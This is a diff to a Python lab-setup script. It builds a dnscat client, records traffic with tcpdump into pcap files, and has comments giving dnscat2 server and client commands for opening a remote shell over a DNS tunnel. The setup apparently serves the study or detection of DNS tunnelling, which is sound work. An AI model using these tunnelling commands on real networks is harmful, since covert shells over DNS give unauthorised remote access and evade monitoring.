@@ -67,26 +67,30 @@ subprocess.run(["bundle", "install"])
 # Start SSH service
 subprocess.run(["service", "ssh", "start"])
 
+# build dnscat client binary
 os.chdir(f"/home/{new_username}/dns/client")
 subprocess.run("make")
 print("client built")
 
+# tcpdump configuration to save unique pcap files in /pink volume
 hostname = socket.gethostname()
 output_file = f"/pink/output_{hostname}.pcap"
-
-# Start tcpdump as a subprocess
 tcpdump_command = ["tcpdump", "-i", "eth0", "-w", output_file]
 subprocess.Popen(tcpdump_command)
 
-# Sleep for 10,000 seconds
-time.sleep(1000000)
 
-
+# dns tunneling: initiate client & server listner in tmux session
+# dns server first: 
+# ruby dnscat2.rb --secret=abc
+# enter session server: session -i 1
+# shell
+# session -i 2
+#  NOW ANY COMMANDS CAN BE RUN - (except possibly ssh- no psudo terminal)
+# ping 172.20.0.2
 
 # dns client command:  
 # ./dnscat --dns server=172.20.0.3,port=53 --secret=abc
 
-# dns server: 
-# ruby dnscat2.rb --secret=abc
-# session server: session -i 1
-# ping 172.20.0.2
+time.sleep(1000000)
+
+
